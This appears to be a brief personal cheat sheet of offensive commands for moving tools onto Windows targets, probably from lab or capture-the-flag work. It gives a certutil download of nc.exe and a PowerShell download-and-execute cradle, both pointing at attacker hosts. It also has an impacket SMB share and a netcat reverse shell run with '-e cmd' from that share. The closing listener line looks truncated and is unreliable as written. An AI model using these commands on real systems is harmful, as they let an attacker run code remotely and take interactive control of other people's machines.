____

# Certutil

```cmd
certutil.exe -f -urlcache -split http://10.10.14.21/nc.exe
```

# PowerShell

```bash
IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.10/test.ps1')
```


# SMB 

/usr/share/seclists/Web-Shells/FuzzDB/nc.exe

```bash
impacket-smbserver smbFolder $(pwd) -smb2support
```


```cmd
\\10.10.14.11\smbFolder\nc.exe -e cmd 10.10.14.11 443
```

```bash
sudo rlwrap 443
```
